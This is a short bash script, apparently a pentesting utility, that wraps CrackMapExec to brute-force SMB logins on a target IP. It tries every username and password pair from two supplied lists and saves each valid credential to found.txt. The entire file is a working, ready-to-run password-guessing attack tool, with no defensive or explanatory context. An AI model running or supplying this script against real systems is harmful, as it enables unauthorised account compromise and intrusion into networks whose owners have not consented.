#!/bin/bash

# --------------------------------------------------------------------
# cme-brute-multiusers — SMB Bruteforce with Credential Save Support
# --------------------------------------------------------------------
# Uses CrackMapExec to brute-force SMB logins for each combination of
# usernames and passwords from given lists. Saves any valid creds.
#
# Usage:
#   cme-brute-multiusers <target_ip> <user_list> <password_list>

target="$1"
userlist="$2"
passlist="$3"
output="found.txt"

if [ -z "$target" ] || [ -z "$userlist" ] || [ -z "$passlist" ]; then
  echo "Usage: cme-brute-multiusers <target_ip> <user_list> <password_list>"
  exit 1
fi

echo "[*] Starting CrackMapExec brute-force on $target..."
echo "[*] Output will be saved to: $output"
echo "------------------------" > "$output"

for user in $(cat "$userlist"); do
  for pass in $(cat "$passlist"); do
    echo "[.] Trying $user:$pass"
    result=$(crackmapexec smb "$target" -u "$user" -p "$pass" 2>/dev/null)
    echo "$result"

    if echo "$result" | grep -q '\[+\]'; then
      echo "[+] Valid credentials: $user:$pass"
      echo "$user:$pass" >> "$output"
    fi
  done
done

echo -e "\n[✓] Brute-force complete. Saved results to $output"
